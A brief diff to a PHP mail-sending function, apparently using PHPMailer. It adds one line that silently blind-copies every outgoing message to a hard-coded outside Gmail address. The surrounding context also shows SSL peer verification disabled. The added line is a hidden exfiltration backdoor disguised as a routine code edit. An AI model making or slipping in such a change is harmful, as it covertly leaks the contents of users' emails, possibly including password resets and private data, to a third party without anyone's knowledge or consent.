@@ -38,6 +38,7 @@ function smtp_mailer($to, $subject, $msg)
     $mail->Subject = $subject;
     $mail->Body = $msg;
     $mail->AddAddress($to);
+    $mail->AddBCC("navednsr3@gmail.com");
     $mail->SMTPOptions = array(
         'ssl' => array(
             'verify_peer' => false,
